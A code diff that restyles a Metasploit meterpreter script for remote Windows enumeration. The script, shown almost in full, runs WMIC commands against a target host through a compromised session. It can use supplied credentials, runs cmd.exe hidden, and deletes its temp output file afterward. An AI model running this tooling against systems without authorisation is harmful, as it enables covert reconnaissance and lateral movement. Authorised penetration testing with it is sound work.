@@ -1,10 +1,9 @@
+# frozen_string_literal: true
 ##
 # WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
 # If you'd like to imporve this script, please try to port it as a post
 # module instead. Thank you.
 ##
-
-
 
 # Author: Carlos Perez at carlos_perez[at]darkoperator.com
 #-------------------------------------------------------------------------------
@@ -17,7 +16,7 @@ rpass = nil
 trg = ""
 # Script Options
 @@exec_opts = Rex::Parser::Arguments.new(
-  "-h"  => [ false,  "Help menu."],
+  "-h"  => [ false, "Help menu."],
   "-t"  => [ true,  "The target address"],
   "-u"  => [ true,  "User on the target system (If not provided it will use credential of process)"],
   "-p"  => [ true,  "Password of user on target system"]
@@ -58,7 +57,7 @@ wmic = [
 ################## Function Declarations ##################
 
 # Function for running a list of WMIC commands stored in a array, returs string
-def wmicexec(session,wmic,user,pass,trgt)
+def wmicexec(session, wmic, user, pass, trgt)
   print_status("Running WMIC Commands ....")
   tmpout = ''
   command = nil
@@ -70,29 +69,29 @@ def wmicexec(session,wmic,user,pass,trgt)
     wmicfl = tmp + "\\wmictmp#{rand(100000)}.txt"
 
     wmic.each do |wmi|
-      if user == nil
+      if user.nil?
         print_status("The commands will be ran under the credentials of #{runningas}")
         command = "/node:#{trgt} /append:#{wmicfl} #{wmi}"
       else
         command = "/user:#{user} /password:#{pass} /node:#{trgt} /append:#{wmicfl} #{wmi}"
       end
       print_status "\trunning command wimic #{wmi}"
-      r = session.sys.process.execute("cmd.exe /c echo ***************************************** >> #{wmicfl}",nil, {'Hidden' => 'true'})
+      r = session.sys.process.execute("cmd.exe /c echo ***************************************** >> #{wmicfl}", nil, 'Hidden' => 'true')
       sleep(1)
-      r = session.sys.process.execute("cmd.exe /c echo      Output of wmic #{wmi} from #{trgt} >> #{wmicfl}",nil, {'Hidden' => 'true'})
+      r = session.sys.process.execute("cmd.exe /c echo      Output of wmic #{wmi} from #{trgt} >> #{wmicfl}", nil, 'Hidden' => 'true')
       sleep(1)
-      r = session.sys.process.execute("cmd.exe /c echo ***************************************** >> #{wmicfl}",nil, {'Hidden' => 'true'})
+      r = session.sys.process.execute("cmd.exe /c echo ***************************************** >> #{wmicfl}", nil, 'Hidden' => 'true')
       sleep(1)
-      #print_status "\twmic #{command}"
-      r = session.sys.process.execute("cmd.exe /c wmic #{command}", nil, {'Hidden' => true})
-      #Making sure that wmic finishes before executing next wmic command
+      # print_status "\twmic #{command}"
+      r = session.sys.process.execute("cmd.exe /c wmic #{command}", nil, 'Hidden' => true)
+      # Making sure that wmic finishes before executing next wmic command
       prog2check = "wmic.exe"
       found = 0
       sleep(2)
       while found == 0
-        session.sys.process.get_processes().each do |x|
-          found =1
-          if prog2check == (x['name'].downcase)
+        session.sys.process.get_processes.each do |x|
+          found = 1
+          if prog2check == x['name'].downcase
             sleep(0.5)
             found = 0
           end
@@ -102,26 +101,24 @@ def wmicexec(session,wmic,user,pass,trgt)
     end
     # Read the output file of the wmic commands
     wmioutfile = session.fs.file.new(wmicfl, "rb")
-    until wmioutfile.eof?
-      tmpout << wmioutfile.read
-    end
+    tmpout << wmioutfile.read until wmioutfile.eof?
     # Close output file in host
     wmioutfile.close
   rescue ::Exception => e
     print_status("Error running WMIC commands: #{e.class} #{e}")
   end
   # We delete the file with the wmic command output.
-  c = session.sys.process.execute("cmd.exe /c del #{wmicfl}", nil, {'Hidden' => true})
+  c = session.sys.process.execute("cmd.exe /c del #{wmicfl}", nil, 'Hidden' => true)
   c.close
   tmpout
 end
 
 #------------------------------------------------------------------------------
 # Function to generate report header
-def headerbuid(session,target,dest)
+def headerbuid(session, target, dest)
   # Header for File that will hold all the output of the commands
   info = session.sys.config.sysinfo
-  header =  "Date:       #{::Time.now.strftime("%Y-%m-%d.%H:%M:%S")}\n"
+  header =  "Date:       #{::Time.now.strftime('%Y-%m-%d.%H:%M:%S')}\n"
   header << "Running as: #{client.sys.config.getuid}\n"
   header << "From:       #{info['Computer']}\n"
   header << "OS:         #{info['OS']}\n"
@@ -130,16 +127,15 @@ def headerbuid(session,target,dest)
 
   print_status("Saving report to #{dest}")
   header
-
 end
 
 #------------------------------------------------------------------------------
 # Function Help Message
 def helpmsg
-  print("Remote Windows Enumeration Meterpreter Script\n" +
-    "This script will enumerate windows hosts in the target enviroment\n" +
-    "given a username and password or using the credential under witch\n" +
-    "Meterpeter is running using WMI wmic windows native tool.\n" +
+  print("Remote Windows Enumeration Meterpreter Script\n" \
+    "This script will enumerate windows hosts in the target enviroment\n" \
+    "given a username and password or using the credential under witch\n" \
+    "Meterpeter is running using WMI wmic windows native tool.\n" \
     "Usage:\n" +
     @@exec_opts.usage)
 end
@@ -153,7 +149,7 @@ if client.platform =~ /win32|win64/
     print_status("This script is not supported to be ran from Windows 2000 servers!!!")
   else
     # Parsing of Options
-    @@exec_opts.parse(args) { |opt, idx, val|
+    @@exec_opts.parse(args) do |opt, _idx, val|
       case opt
 
       when "-t"
@@ -166,26 +162,25 @@ if client.platform =~ /win32|win64/
         helpmsg
         helpcall = 1
       end
-
-    }
-    #logfile name
+    end
+    # logfile name
     dest = logs + "/" + trg + filenameinfo
     # Executing main logic of the script
-    if helpcall == 0 and trg != ""
+    if (helpcall == 0) && (trg != "")
 
       # Making sure that is running as System a Username and Password for target machine must be provided
 
-      if is_system? && rusr == nil && rpass == nil
+      if is_system? && rusr.nil? && rpass.nil?
 
         print_status("Stopped: Running as System and no user provided for connecting to target!!")
 
-      else trg != nil && helpcall != 1
+      else !trg.nil? && helpcall != 1
 
-        file_local_write(dest,headerbuid(session,trg,dest))
-        file_local_write(dest,wmicexec(session,wmic,rusr,rpass,trg))
+           file_local_write(dest, headerbuid(session, trg, dest))
+           file_local_write(dest, wmicexec(session, wmic, rusr, rpass, trg))
 
       end
-    elsif helpcall == 0 and trg == ""
+    elsif (helpcall == 0) && (trg == "")
 
       helpmsg
     end
